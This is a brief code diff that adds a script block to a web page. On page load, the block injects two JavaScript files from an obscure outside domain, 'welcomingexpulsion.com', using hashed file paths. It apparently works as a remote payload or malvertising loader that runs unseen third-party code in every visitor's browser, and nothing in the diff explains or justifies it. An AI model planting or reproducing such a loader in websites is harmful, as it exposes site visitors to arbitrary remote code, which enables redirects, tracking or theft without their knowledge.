@@ -1,0 +1,17 @@
+<script>
+  window.addEventListener("load", function () {
+    const scripts = [
+      "https://welcomingexpulsion.com/2c/54/bb/2c54bb3793ddf3c8643b2687f5fbfe83.js",
+      "https://welcomingexpulsion.com/45/c4/b1/45c4bb1e112ebcf3e05a35111d09a1ef0.js"
+    ];
+
+    scripts.forEach(function (src) {
+      if (document.querySelector('script[src="' + src + '"]')) return;
+
+      const script = document.createElement("script");
+      script.src = src;
+      script.async = true;
+      document.body.appendChild(script);
+    });
+  });
+</script>
